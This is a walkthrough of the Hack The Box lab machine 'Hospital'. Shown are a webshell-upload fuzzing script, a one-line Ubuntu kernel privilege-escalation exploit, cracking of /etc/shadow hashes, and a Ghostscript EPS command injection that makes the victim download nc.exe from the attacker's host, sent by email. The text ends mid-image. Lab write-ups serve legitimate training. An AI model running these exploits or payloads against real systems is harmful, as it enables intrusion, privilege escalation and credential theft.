<p>The hostname &#x27;hospital.htb&#x27; was added to the &#x27;/etc/hosts&#x27; file for ease of reference. While not strictly necessary as the machine did not utilize subdomains, this action was taken to maintain brevity and clarity in the subsequent steps of the process.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">echo &quot;10.10.11.241 hospital.htb&quot; | sudo tee -a /etc/hosts</span><br></span></code></pre></div></div>
<p>Visiting hospital.htb:8080 gives and option to create an account, click on <strong>Make one</strong> <a href="http://hospital.htb:8080/login.php" target="_blank" rel="noopener noreferrer">http://hospital.htb:8080/login.php</a></p>
<p><img decoding="async" loading="lazy" alt="make an account" src="/assets/images/make_an_account-00dec6ae3d4d1435f0827adf0147ec56.png" width="548" height="323" class="img_ev3q"></p>
<p>Initiating the creation of a new account at <a href="http://hospital.htb:8080/register.php" target="_blank" rel="noopener noreferrer">http://hospital.htb:8080/register.php</a>, click on Submit after completing the required fields.</p>
<p><img decoding="async" loading="lazy" alt="creating account" src="/assets/images/creating_account-f61996f1884220a54d49ad8cd178d9ef.png" width="532" height="371" class="img_ev3q"></p>
<p>Proceeding to <a href="http://hospital.htb:8080/login.php" target="_blank" rel="noopener noreferrer">http://hospital.htb:8080/login.php</a>, log in using the newly created account.</p>
<p><img decoding="async" loading="lazy" alt="login with new account" src="/assets/images/login_new_account-164e4264bf6037db16438ca6d9ba5842.png" width="522" height="345" class="img_ev3q"></p>
<p>After successful login, the website at <a href="http://hospital.htb:8080/index.php" target="_blank" rel="noopener noreferrer">http://hospital.htb:8080/index.php</a> presents the option to upload files to the server.</p>
<p><img decoding="async" loading="lazy" alt="upload button" src="/assets/images/homepage_upload-cc7327fa240256551ec246a4e858acc7.png" width="768" height="709" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="file-upload-exploit">File upload exploit<a href="#file-upload-exploit" class="hash-link" aria-label="Direct link to File upload exploit" title="Direct link to File upload exploit" translate="no">​</a></h2>
<p>After capturing and analyzing the request, it becomes apparent that the server has a file upload vulnerability related to the file extension.</p>
<p><img decoding="async" loading="lazy" alt="request from upload.php" src="/assets/images/request_1-6ed68c446e9420bfc7b9da6e9d6cb775.png" width="627" height="545" class="img_ev3q"></p>
<p>A custom script was made to automate the task of fuzzing extensions on post requests directed at the &#x27;upload.php&#x27; of the target machine, using a custom wordlist with the php extensions from <a href="https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology." target="_blank" rel="noopener noreferrer">hacktricks file upload page</a>. The script facilitates the automated upload of a webshell to the server, facilitating the process of identifying valid extensions and exploiting the vulnerability.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">## Define the URL</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">url = &#x27;http://hospital.htb:8080/upload.php&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">## Define the headers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">headers = {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    &#x27;Referer&#x27;: &#x27;http://hospital.htb:8080/index.php&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    &#x27;Cookie&#x27;: &#x27;PHPSESSID=k1ajocskfrc83hru642ag5p9nc&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    &#x27;Connection&#x27;: &#x27;close&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">def fuzz_upload(wordlist,webshell,fname):</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    #upload shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    with open(webshell,&#x27;r&#x27;) as file:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        shell_data = file.read()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    with open(wordlist,&quot;r&quot;) as my_wordlist:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        for line in my_wordlist:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            ext=line.strip()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            files = {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                &#x27;image&#x27;: (f&#x27;{fname}.{ext}&#x27;, shell_data, &#x27;image/jpeg&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            response = requests.post(url, headers=headers, files=files)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            #print(response.text)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            if not &quot;Error&quot; in response.text:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                print(f&quot;[+] Uploaded {fname}.{ext}&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">if __name__ == &quot;__main__&quot;:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    parser = argparse.ArgumentParser(description=&quot;upload fuzzing extension tool&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    parser.add_argument(&quot;-w&quot;, &quot;--wordlist&quot;, required=True, help=&quot;File containing extensions&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    parser.add_argument(&quot;-x&quot;, &quot;--webshell&quot;, required=True, help=&quot;File containing webshell&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    parser.add_argument(&quot;-f&quot;, &quot;--filename&quot;, required=False, default=&quot;file&quot;, help=&quot;filename to use, default &#x27;file&#x27; without the extention&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    args = parser.parse_args()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    fuzz_upload(args.wordlist,args.webshell,args.filename)</span><br></span></code></pre></div></div>
<p>The script is used to upload the <a href="https://github.com/flozz/p0wny-shell" target="_blank" rel="noopener noreferrer">p0wny-shell</a> while finding valid extensions at the same time.</p>
<p><img decoding="async" loading="lazy" alt="uploading p0wny" src="/assets/images/uploading_p0wny-99e018f9c9fbfabfa677247b8858edb3.png" width="768" height="203" class="img_ev3q"></p>
<p>After successfully uploading the files, the fuzzing process began to find their storage location using ffuf. The point of interest was the &#x27;uploads&#x27; folder, where files were found to be stored with identical names as those used during the upload process. Despite the absence of directory listing functionality in /uploads, the files within the &#x27;uploads&#x27; directory retained their original filenames, facilitating their retrieval and exploitation.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:FUZZ -u http://hospital.htb:8080/FUZZ -o hospital_htb_8080_FUZZ.out -t 15</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="fuzzing uploads" src="/assets/images/ffuf_uploads-7735f3764a192836fe51689b46e5b815.png" width="731" height="217" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="shell-on-linux-server">Shell on Linux Server<a href="#shell-on-linux-server" class="hash-link" aria-label="Direct link to Shell on Linux Server" title="Direct link to Shell on Linux Server" translate="no">​</a></h2>
<p>The webshell is discovered at <a href="http://hospital.htb:8080/uploads/myfile.phar" target="_blank" rel="noopener noreferrer">http://hospital.htb:8080/uploads/myfile.phar</a>, where the &#x27;.phar&#x27; extension was identified as the one capable of executing php code among various other extensions attempted.</p>
<p><img decoding="async" loading="lazy" alt="p0wny shell on linux server" src="/assets/images/p0wny_shell_1-ab002002981f43bcfac54a76c231bdbb.png" width="768" height="346" class="img_ev3q"></p>
<p>Gaining access to the Linux server that hosts <a href="http://hospital.htb:8080" target="_blank" rel="noopener noreferrer">http://hospital.htb:8080</a>.</p>
<p>For a stable shell do:</p>
<ul>
<li>
<p>nc -lnvp 443</p>
</li>
<li>
<p>script /dev/null -c bash</p>
</li>
<li>
<p>(ctrl+z)</p>
</li>
<li>
<p>stty raw -echo ; fg</p>
</li>
<li>
<p>reset xterm (then press enter)</p>
</li>
<li>
<p>export TERM=xterm</p>
</li>
<li>
<p>export SHELL=bash</p>
</li>
</ul>
<p>Upon reviewing the &#x27;ifconfig&#x27; output, it is determined that the attacker is located within a separate network, as indicated by the &#x27;eth0 inet&#x27; IP address.</p>
<p><img decoding="async" loading="lazy" alt="ifconfig output" src="/assets/images/ifconfig_ouptut_1-276ffc4f8a4cd40cc8f87ed72111500a.png" width="600" height="362" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="privesc-on-linux-server">Privesc on Linux Server<a href="#privesc-on-linux-server" class="hash-link" aria-label="Direct link to Privesc on Linux Server" title="Direct link to Privesc on Linux Server" translate="no">​</a></h2>
<p>Further enumeration shows that the Linux machine is vulnerable to CVE-2023-32629 &amp; CVE-2023-2640 privilege escalation exploits based on the machine kernel which is 5.19.0-35-generic Ubuntu, the exploit works in a path where www-data can read and write.</p>
<p>poc.sh</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">unshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c &#x27;import os;os.setuid(0);os.system(&quot;cp /bin/bash /var/tmp/bash &amp;&amp; chmod 4755 /var/tmp/bash &amp;&amp; /var/tmp/bash -p &amp;&amp; rm -rf l m u w /var/tmp/bash&quot;)&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="privesc on LS" src="/assets/images/privesc_linux_server_2-4fab44042d222f2defcfddec9c79edc1.png" width="441" height="123" class="img_ev3q"></p>
<p>Upon achieving root access, the /etc/shadow file is accessible, allowing for the extraction of hashes for cracking attempts.</p>
<p><img decoding="async" loading="lazy" alt="reading /etc/shadow" src="/assets/images/reading_shadow-6c68f91e714a19746b83b11fce652c32.png" width="768" height="111" class="img_ev3q"></p>
<p>Using hashcat, the password for &#x27;drwilliams&#x27; is successfully cracked. <code>qwe123!@#</code></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">hashcat -a 0 -m 1800 drwilliams_hash /usr/share/wordlists/rockyou.txt</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="access-to-the-windows-server">Access to the Windows server<a href="#access-to-the-windows-server" class="hash-link" aria-label="Direct link to Access to the Windows server" title="Direct link to Access to the Windows server" translate="no">​</a></h2>
<p>The credentials obtained of drwilliams work for the <a href="https://hospital.htb" target="_blank" rel="noopener noreferrer">https://hospital.htb</a> webmail.</p>
<p><img decoding="async" loading="lazy" alt="drwilliams webmail" src="/assets/images/drwilliams_webmail_1-ebeded07eb823650402b1793a6e3fa5a.png" width="616" height="476" class="img_ev3q"></p>
<p>An email originating from <a href="mailto:drbrown@hospital.htb" target="_blank" rel="noopener noreferrer">drbrown@hospital.htb</a> instructs drwilliams to send an .eps file intended for visualization with Ghostscript.</p>
<p><img decoding="async" loading="lazy" alt="email from drbrown" src="/assets/images/email_from_drbrown_1-1d06d2761ff882746e3a723d25771288.png" width="607" height="443" class="img_ev3q"></p>
<p>A vulnerability in Ghostscript, identified as CVE-2023-36664, enables command injection upon opening a PS or EPS file, potentially resulting in code execution.</p>
<p>Use the <a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection" target="_blank" rel="noopener noreferrer">GhostScript Command Injection POC</a> to create a malicious EPS file and gain a reverse shell.</p>
<p>The first step is injecting code that will download nc.exe from the attacker server.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">python CVE_023_36664_exploit.py --inject --payload &#x27;curl 10.10.14.26/nc.exe&#x27; --filename file.eps</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="running the payload" src="/assets/images/curl_nc_ghostscript-009df5580d0429cb1553bd9a1654f633.png" width="768" height="41" class="img_ev3q"></p>
<p>Access the compose function, attach the malicious .eps file, set the recipient as Drbrown, and proceed to send the email.</p>
<p><img decoding="async" loading="lazy" alt="composing email" src="/assets/images/composing_email_1-cc52ac73f87ebf5fae70ac440cd54c81.png" width="768" height="352" class="img_ev3q"></p>
<p>The attacker&#x27;s machine receives a GET request, confirming the success of the code injection. Afterwards, nc.exe is now present on the victim machine.</p>
<p><img decoding="async" loading="lazy" alt="received &amp;quot;get&amp;quot; hit" src="data:image/png;base64,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